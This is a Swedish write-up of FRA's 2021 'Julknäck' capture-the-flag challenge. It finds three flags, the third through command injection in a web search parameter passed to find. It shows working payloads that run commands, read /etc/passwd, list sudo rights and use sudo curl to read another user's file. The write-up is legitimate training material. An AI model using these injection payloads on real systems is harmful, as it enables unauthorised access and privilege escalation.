# Anteckningar genomgång av FRA Julknäck första advent 2021

Länk till CTF finns på [challenge.fra.se](https://challenge.fra.se/) och sen säger att CTF finns på extern webb på http://46.246.30.86/.

Bestämt mig för att försöka göra så mycket som möjligt av CTF:en från en [Docker](https://www.docker.com/)-container som kör [Kali](https://www.kali.org/) Linux. Börjar med att se till att ha ett alias klart:

    alias kali='docker run -it --rm --name kali kalilinux/kali'

Börjar med att uppdatera denna container och installera curl efter att ha kört aliaset ovan.

    apt update
    apt dist-upgrade -y
    apt install -y curl

Låt se hur svårt [FRA](https://www.fra.se) har gjort CTF:en.

    ┌──(root💀323736a03db8)-[/]
    └─# curl -i http://46.246.30.86/
	HTTP/1.1 200 OK
	Date: Sat, 27 Nov 2021 14:35:03 GMT
	Server: Apache/2.4.37 (centos)
	X-Powered-By: PHP/7.4.24
	Transfer-Encoding: chunked
	Content-Type: text/html; charset=UTF-8

    <!DOCTYPE html>
    <html>
    <head>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="HandheldFriendly" content="true">
    <style>
    body {
      background-color: white;
      position: relative;
      color: black;
      text-align: center;
    }
    form {
      position: relative;
    }
    </style>
    <img src="fra-logo.png" alt="DATA" width="400" height="200">
    </head>
    <body>
     <form method="GET">
     <input type="text" name="search" />
     <input type="Submit" value="Search">
    </form>
    
    <h1>Välkommen till vår mobilvänliga CTF!</h1>
    
    <h2>Det finns 3 flaggor att hämta.</h2>
    <h3>Flagga1: Närmare än vad du tror</h3>
    <h3>Flagga2: En sökning bort</h3>
    <h3>Flagga3: I developers home</h3>
    <!-- Flagga1 -->
    <!-- flagga{may_the_source_be_with_you} -->
    </body>

Första flaggan var väldigt lätt: **flagga{may_the_source_be_with_you}**

Vi har även fått tips om att söka efter flagga två och flagga tre är i "developers home". Låt oss börja med att söka. Testade *FRA* som första sökterm men det gav inget. Testade sedan *Flagga2*:

    ┌──(root💀323736a03db8)-[/]
    └─# curl http://46.246.30.86/?search=Flagga2
    <!DOCTYPE html>
    <html>
    <head>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="HandheldFriendly" content="true">
    <style>
    body {
      background-color: white;
      position: relative;
      color: black;
      text-align: center;
    }
    form {
      position: relative;
    }
    </style>
    <img src="fra-logo.png" alt="DATA" width="400" height="200">
    </head>
    <body>
     <form method="GET">
     <input type="text" name="search" />
     <input type="Submit" value="Search">
    </form>
     <div id="search_results"><h3>Sökresultat</h3><!--
    <p class="indent">./Flagga2</p><br>
     --></div>
    <h1>Välkommen till vår mobilvänliga CTF!</h1>
    
    <h2>Det finns 3 flaggor att hämta.</h2>
    <h3>Flagga1: Närmare än vad du tror</h3>
    <h3>Flagga2: En sökning bort</h3>
    <h3>Flagga3: I developers home</h3>
    <!-- Flagga1 -->
    <!-- flagga{may_the_source_be_with_you} -->
    </body>

Ovan ser vi ett dolt sökresultat med en del som ser ut som en sökväg nämligen **./Flagga2**. Hämta den sidan:

	┌──(root💀323736a03db8)-[/]
	└─# curl http://46.246.30.86/Flagga2
	flagga{Flagga3_is_in_developers_home}

Flagga två är därmed: **flagga{Flagga3_is_in_developers_home}**

Här verkade det hända något med servern under lördag eftermiddag (2021-11-27) och jag fick ta en paus. 

Fortsatte på tisdagen och då gick det bättre. Började med att söka efter en tom sträng.

    ┌──(root💀ae9d1c01fdfd)-[/]
    └─# curl -s -i 'http://46.246.30.86/?search='
    HTTP/1.1 200 OK
    Date: Tue, 30 Nov 2021 19:40:19 GMT
    Server: Apache/2.4.37 (centos)
    X-Powered-By: PHP/7.4.24
    Transfer-Encoding: chunked
    Content-Type: text/html; charset=UTF-8
    
    <!DOCTYPE html>
    <html>
    <head>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="HandheldFriendly" content="true">
    <style>
    body {
      background-color: white;
      position: relative;
      color: black;
      text-align: center;
    }
    form {
      position: relative;
    }
    </style>
    <img src="fra-logo.png" alt="DATA" width="400" height="200">
    </head>
    <body>
     <form method="GET">
     <input type="text" name="search" />
     <input type="Submit" value="Search">
    </form>
     <div id="search_results"><h3>Sökresultat</h3><!--
    <p class="indent">/usr/bin/find: missing argument to `-name'</p><br>
     --></div>
    <h1>Välkommen till vår mobilvänliga CTF!</h1>
    
    <h2>Det finns 3 flaggor att hämta.</h2>
    <h3>Flagga1: Närmare än vad du tror</h3>
    <h3>Flagga2: En sökning bort</h3>
    <h3>Flagga3: I developers home</h3>
    <!-- Flagga1 -->
    <!-- flagga{may_the_source_be_with_you} -->
    </body>

Vi kan se tecken på att **/usr/bin/find** anropas för att söka efter filer som ges som argument. Gjorde ett par försök att köra **find** med flaggan **-exec** men det resulterade i lite varningar. Testade istället att se om det gick att använda **;** för att köra valfritt kommando. Kör en echo på Hej och se om vi får tillbaka den.

	┌──(root💀ae9d1c01fdfd)-[/]
	└─# curl -s -i 'http://46.246.30.86/?search=-exec;echo%20Hej' | grep Hej
	<p class="indent">Hej</p><br>

Vi ska hitta flaggan i developers home. Så se om det finns en sådan användare på servern.

	┌──(root💀ae9d1c01fdfd)-[/]
	└─# curl -s -i 'http://46.246.30.86/?search=-exec;cat+/etc/passwd' | grep developer
	<p class="indent">developer:x:1001:1001::/home/developer:/bin/bash</p><br>
	<h3>Flagga3: I developers home</h3>

Finns en katalog för användaren *developer*. Kan vi hitta filen */home/developer/Flagga3* där?

	┌──(root💀ae9d1c01fdfd)-[/]
	└─# curl -s -i 'http://46.246.30.86/?search=*;ls+/home/developer/Flagga3' | grep developer
	<p class="indent">ls: cannot access '/home/developer/Flagga3': Permission denied</p><br>
	<h3>Flagga3: I developers home</h3>

För att komma åt den katalogen behöver vi exekvera kod som användaren *developer*. Kan vi göra sudo som användaren?

	┌──(root💀ae9d1c01fdfd)-[/]
	└─# curl -s -i 'http://46.246.30.86/?search=*;sudo+-l' | grep indent
	<p class="indent">Matching Defaults entries for apache on ctf:</p><br>
	<p class="indent">    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin</p><br>
	<p class="indent"></p><br>
	<p class="indent">User apache may run the following commands on ctf:</p><br>
	<p class="indent">    (developer) NOPASSWD: /usr/bin/curl</p><br>

Vi kan använda **/usr/bin/curl**. Finns även kommentar om det :)

	┌──(root💀ae9d1c01fdfd)-[/]
	└─# curl -s -i 'http://46.246.30.86/?search=*;sudo+-u+developer+/usr/bin/curl+-s+file:///home/developer/Flagga3' | grep flagga
	<p><a href="flagga{https://www.fra.se/jobbahososs.4.6a76c4041614726b25ad2.html}">flagga{https://www.fra.se/jobbahososs.4.6a76c4041614726b25ad2.html}</a></p><br>
	<!-- flagga{may_the_source_be_with_you} -->

Vi har nu Flagga3: **flagga{https://www.fra.se/jobbahososs.4.6a76c4041614726b25ad2.html}**

Det är en sida om att jobba på FRA:

	┌──(root💀ae9d1c01fdfd)-[/]
	└─# curl -s https://www.fra.se/jobbahososs.4.6a76c4041614726b25ad2.html | grep title | head -1
      	  <title>Jobba hos oss - FRA</title>

Flaggorna är alltså:

- flagga{may_the_source_be_with_you}
- flagga{Flagga3_is_in_developers_home}
- flagga{https://www.fra.se/jobbahososs.4.6a76c4041614726b25ad2.html}

